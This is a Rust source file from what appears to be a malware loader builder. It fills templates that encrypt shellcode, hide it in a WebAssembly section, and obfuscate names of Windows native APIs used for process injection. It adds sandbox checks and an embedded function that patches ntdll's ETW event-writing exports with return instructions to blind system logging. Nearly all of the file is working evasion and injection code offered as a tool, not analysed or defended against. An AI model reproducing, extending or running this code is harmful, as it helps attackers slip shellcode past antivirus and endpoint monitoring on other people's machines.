//! Placeholder substitution map construction.
//!
//! Builds the `{{KEY}} -> value` map that is applied to template files.
//! Each function here is responsible for one category of replacement
//! (encryption output, target process, sandbox, API obfuscation).

use crate::config::{Encryption, Execution, Order};
use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
use crate::sandbox::build_sandbox;
use anyhow::{Context, Result};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
const COMMON_MODULE_DECL: &str = "mod common;";

pub(super) fn build_dependencies(template_dependencies: Option<String>) -> String {
    match template_dependencies {
        Some(deps) if !deps.trim().is_empty() => {
            format!("{}\n{}", LITCRYPT_DEPENDENCY, deps)
        }
        _ => LITCRYPT_DEPENDENCY.to_string(),
    }
}

pub fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
    match encryption {
        Encryption::Xor => "input.xor",
        Encryption::Aes => "input.aes",
        Encryption::Uuid => "input.uuid",
    }
}

fn build_encrypted_output(
    order: &Order,
    src_dir: &Path,
) -> Result<(crate::encryption::EncryptionOutput, String, PathBuf)> {
    let filename = get_encrypted_filename(&order.encryption);
    let path = src_dir.join(filename);
    let include_path = format!("\"{}\"", filename);
    let output =
        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption)
            .context("Failed to encrypt shellcode")?;
    Ok((output, include_path, path))
}

fn build_basic_replacements(
    enc_output: crate::encryption::EncryptionOutput,
    include_path: String,
) -> HashMap<&'static str, String> {
    let dependencies = build_dependencies(enc_output.dependencies);
    let mut replacements = HashMap::new();
    replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
    replacements.insert("{{MAIN}}", enc_output.main);
    replacements.insert("{{DEPENDENCIES}}", dependencies);
    replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
    replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
    replacements.insert("{{COMMON_MODULE}}", COMMON_MODULE_DECL.to_string());
    replacements.insert("{{DLL_MAIN}}", String::new());
    replacements.insert("{{DLL_FORMAT}}", String::new());
    replacements
}

fn add_target_process_replacement(replacements: &mut HashMap<&'static str, String>, target: &str) {
    replacements.insert("{{TARGET_PROCESS}}", obfuscate_string_for_template(target));
}

fn add_sandbox_replacements(replacements: &mut HashMap<&'static str, String>, domain: &str) {
    let sandbox_output = build_sandbox(domain);
    replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
    replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
}

fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, String>) {
    let key = non_zero_random_key();
    replacements.insert("{{API_KEY}}", format!("0x{:02x}", key));
    replacements.insert(
        "{{OBF_NT_OPEN_PROCESS}}",
        obfuscate_api_name("NtOpenProcess", key),
    );
    replacements.insert(
        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtAllocateVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtWriteVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtProtectVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_CREATE_THREAD_EX}}",
        obfuscate_api_name("NtCreateThreadEx", key),
    );
    replacements.insert(
        "{{OBF_NT_QUEUE_APC_THREAD}}",
        obfuscate_api_name("NtQueueApcThread", key),
    );
    replacements.insert(
        "{{OBF_NT_TEST_ALERT}}",
        obfuscate_api_name("NtTestAlert", key),
    );
    replacements.insert(
        "{{OBF_NT_DELAY_EXECUTION}}",
        obfuscate_api_name("NtDelayExecution", key),
    );
}

fn add_etw_patch_replacements(replacements: &mut HashMap<&'static str, String>, enable: bool) {
    if !enable {
        replacements.insert("{{ETW_PATCH_FUNCTION}}", String::new());
        replacements.insert("{{ETW_PATCH_CALL}}", String::new());
        return;
    }

    let etw_patch_function = r#"
unsafe fn patch_etw() {
    use ntapi::ntpsapi::NtCurrentProcess;
    use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};
    use winapi::ctypes::c_void;
    use winapi::shared::ntdef::NT_SUCCESS;
    use rust_syscalls::syscall;

    #[repr(C)]
    struct PEB {
        _reserved: [u8; 8],
        ldr: *mut PEB_LDR_DATA,
    }

    #[repr(C)]
    struct PEB_LDR_DATA {
        _reserved: [u8; 16],
        in_load_order_module_list: *mut LIST_ENTRY,
    }

    #[repr(C)]
    struct LIST_ENTRY {
        flink: *mut LIST_ENTRY,
        blink: *mut LIST_ENTRY,
    }

    #[repr(C)]
    struct LDR_DATA_TABLE_ENTRY {
        _reserved: [u8; 32],
        dll_base: *mut u8,
        _reserved2: [u8; 24],
        base_dll_name: *mut u16,
    }

    let peb_ptr: *mut PEB;
    unsafe {
        #[cfg(target_arch = "x86_64")]
        {
            let teb = std::arch::x86_64::_read_gs_base() as *mut u8;
            peb_ptr = *(teb.add(0x60) as *mut *mut PEB);
        }
        #[cfg(target_arch = "x86")]
        {
            let teb = std::arch::x86::_read_fs_base() as *mut u8;
            peb_ptr = *(teb.add(0x30) as *mut *mut PEB);
        }
    }

    let mut current = (*(*peb_ptr).ldr).in_load_order_module_list;
    let ntdll_name = b"ntdll.dll\0";
    let mut ntdll_base: *mut u8 = std::ptr::null_mut();

    while !current.is_null() {
        let entry = current as *mut LDR_DATA_TABLE_ENTRY;
        let dll_name = (*entry).base_dll_name;
        if !dll_name.is_null() {
            let mut i = 0;
            let mut match_found = true;
            while ntdll_name[i] != 0 {
                if (*dll_name.add(i)) as u8 != ntdll_name[i] {
                    match_found = false;
                    break;
                }
                i += 1;
            }
            if match_found && (*dll_name.add(i)) as u8 == 0 {
                ntdll_base = (*entry).dll_base;
                break;
            }
        }
        current = (*current).flink;
    }

    if ntdll_base.is_null() { return; }

    type IMAGE_DOS_HEADER = [u8; 64];
    type IMAGE_NT_HEADERS64 = [u8; 24];
    type IMAGE_DATA_DIRECTORY = [u8; 8];
    type IMAGE_EXPORT_DIRECTORY = [u8; 40];

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers_offset = unsafe { u32::from_le_bytes((*dos_header)[60..64].try_into().unwrap()) };
    let nt_headers = ntdll_base.add(nt_headers_offset as usize) as *const IMAGE_NT_HEADERS64;

    let export_dir_rva = unsafe {
        let data_dir_offset = (*nt_headers)[112..120].as_ptr() as *const IMAGE_DATA_DIRECTORY;
        u32::from_le_bytes((*data_dir_offset)[0..4].try_into().unwrap())
    };

    let export_dir = ntdll_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let number_of_names = unsafe { u32::from_le_bytes((*export_dir)[20..24].try_into().unwrap()) };
    let address_of_names = unsafe { u32::from_le_bytes((*export_dir)[32..36].try_into().unwrap()) };
    let address_of_name_ordinals = unsafe { u32::from_le_bytes((*export_dir)[36..40].try_into().unwrap()) };
    let address_of_functions = unsafe { u32::from_le_bytes((*export_dir)[16..20].try_into().unwrap()) };

    let mut etw_functions = Vec::new();
    let target_names = [
        b"EtwEventWrite\0",
        b"EtwEventWriteFull\0",
        b"EtwEventRegister\0",
        b"EtwEventUnregister\0",
        b"EtwEventEnabled\0",
    ];

    for target_name in target_names.iter() {
        for i in 0..number_of_names {
            let name_rva = unsafe {
                let names_ptr = ntdll_base.add(address_of_names as usize) as *const u32;
                u32::from_le_bytes((*names_ptr.add(i as usize)).to_le_bytes())
            };
            let name_ptr = ntdll_base.add(name_rva as usize) as *const u8;

            let mut j = 0;
            while target_name[j] != 0 && unsafe { *name_ptr.add(j) } != 0 {
                if target_name[j] != unsafe { *name_ptr.add(j) } { break; }
                j += 1;
            }

            if target_name[j] == 0 && unsafe { *name_ptr.add(j) } == 0 {
                let ordinal = unsafe {
                    let ordinals_ptr = ntdll_base.add(address_of_name_ordinals as usize) as *const u16;
                    u16::from_le_bytes((*ordinals_ptr.add(i as usize)).to_le_bytes()) as u32
                };

                let func_rva = unsafe {
                    let funcs_ptr = ntdll_base.add(address_of_functions as usize) as *const u32;
                    u32::from_le_bytes((*funcs_ptr.add(ordinal as usize)).to_le_bytes())
                };

                let func_addr = ntdll_base.add(func_rva as usize);
                etw_functions.push(func_addr);
                break;
            }
        }
    }

    for func_addr in etw_functions {
        let mut old_protect: u32 = 0;
        let mut size: usize = 16;

        let status = syscall!(
            "NtProtectVirtualMemory",
            NtCurrentProcess,
            &mut func_addr as *mut *mut c_void,
            &mut size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect
        );

        if !NT_SUCCESS(status) { continue; }

        let patch_bytes: [u8; 16] = [0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                                     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
        unsafe {
            std::ptr::copy_nonoverlapping(
                patch_bytes.as_ptr(),
                func_addr as *mut u8,
                16,
            );
        }

        let _ = syscall!(
            "NtProtectVirtualMemory",
            NtCurrentProcess,
            &mut func_addr as *mut *mut c_void,
            &mut size,
            old_protect,
            &mut 0
        );
    }
}
"#.to_string();

    replacements.insert("{{ETW_PATCH_FUNCTION}}", etw_patch_function);
    replacements.insert("{{ETW_PATCH_CALL}}", "patch_etw();".to_string());
}

/// Build the full replacement map for a given order.
pub(super) fn build_replacements(
    order: &Order,
    src_dir: &Path,
) -> Result<HashMap<&'static str, String>> {
    let (enc_output, include_path, enc_path) = build_encrypted_output(order, src_dir)?;
    let mut replacements = build_basic_replacements(enc_output, include_path);
    add_target_process_replacement(&mut replacements, &order.target_process);

    // Always add sandbox replacements (empty if no sandbox specified)
    if let Some(ref domain) = order.sandbox {
        add_sandbox_replacements(&mut replacements, domain);
    } else {
        replacements.insert("{{SANDBOX}}", String::new());
        replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
    }

    // The ntWat template wraps the encrypted payload in a WebAssembly module:
    // the encrypted bytes become a wasm data section (generated from a WAT
    // text source, low-entropy), and the loader reads that section back out
    // at runtime before decrypting. Only this template uses {{PATH_TO_WASM}}.
    if matches!(order.execution, Execution::NtWatStager) {
        let wasm_path = src_dir.join("input.wasm");
        crate::wat::build_wasm_payload(&enc_path, &wasm_path)
            .context("Failed to build WebAssembly payload for ntWat template")?;
        replacements.insert("{{PATH_TO_WASM}}", r#""input.wasm""#.to_string());
    }

    add_api_obfuscation_replacements(&mut replacements);
    add_etw_patch_replacements(&mut replacements, order.etw_patch);
    Ok(replacements)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Encryption;
    use std::collections::HashMap;

    #[test]
    fn test_build_dependencies() {
        assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
        assert_eq!(
            build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
            "litcrypt = \"0.4\"\nlibaes = \"0.7\""
        );
    }

    #[test]
    fn test_get_encrypted_filename() {
        assert_eq!(get_encrypted_filename(&Encryption::Xor), "input.xor");
        assert_eq!(get_encrypted_filename(&Encryption::Aes), "input.aes");
        assert_eq!(get_encrypted_filename(&Encryption::Uuid), "input.uuid");
    }

    #[test]
    fn test_build_basic_replacements() {
        let enc_output = crate::encryption::EncryptionOutput {
            decryption_function: "fn dec()".to_string(),
            main: "main()".to_string(),
            dependencies: Some("dep = \"1.0\"".to_string()),
            imports: Some("use std::;".to_string()),
        };
        let replacements = build_basic_replacements(enc_output, "input.xor".to_string());
        assert!(replacements.contains_key("{{PATH_TO_SHELLCODE}}"));
        assert!(replacements.contains_key("{{DECRYPTION_FUNCTION}}"));
    }

    #[test]
    fn test_add_target_process_replacement() {
        let mut replacements = HashMap::new();
        add_target_process_replacement(&mut replacements, "notepad.exe");
        assert!(replacements.contains_key("{{TARGET_PROCESS}}"));
    }

    #[test]
    fn test_add_api_obfuscation_replacements() {
        let mut replacements = HashMap::new();
        add_api_obfuscation_replacements(&mut replacements);
        assert!(replacements.contains_key("{{API_KEY}}"));
        assert!(replacements.contains_key("{{OBF_NT_OPEN_PROCESS}}"));
    }

    #[test]
    fn test_add_etw_patch_replacements() {
        let mut replacements = HashMap::new();
        add_etw_patch_replacements(&mut replacements, true);
        assert!(replacements.contains_key("{{ETW_PATCH_FUNCTION}}"));
        assert!(replacements.contains_key("{{ETW_PATCH_CALL}}"));
        assert!(!replacements["{{ETW_PATCH_FUNCTION}}"].is_empty());
        assert!(!replacements["{{ETW_PATCH_CALL}}"].is_empty());

        let mut replacements = HashMap::new();
        add_etw_patch_replacements(&mut replacements, false);
        assert!(replacements["{{ETW_PATCH_FUNCTION}}"].is_empty());
        assert!(replacements["{{ETW_PATCH_CALL}}"].is_empty());
    }
}
